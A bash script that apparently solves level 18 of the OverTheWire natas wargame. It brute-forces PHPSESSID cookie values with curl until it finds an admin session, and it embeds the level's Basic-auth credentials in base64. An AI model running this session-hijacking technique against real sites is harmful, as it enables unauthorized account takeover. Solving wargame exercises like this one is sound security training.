#!/bin/bash

num=1

pwned=0

while [[ $pwned = 0 ]]; do
  if [[ $num = 640 ]]; then pwned=1; fi

  RESPONSE=$(curl 'http://natas18.natas.labs.overthewire.org/index.php' \
    -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
    -H 'Referer: http://natas18.natas.labs.overthewire.org/' \
    -H "Cookie: PHPSESSID=$num" \
    --silent \
    --data 'username=admin&password=asdfasdf')

  honeypot='You are logged in as a regular user'
  if [[ "$RESPONSE" =~ $honeypot ]]; then
    echo "Attempt with $num failed"
    # echo $RESPONSE
  else
    echo "Succeeded with $num:"
    echo $RESPONSE
    pwned=1
  fi

  num=$((num+1))
done
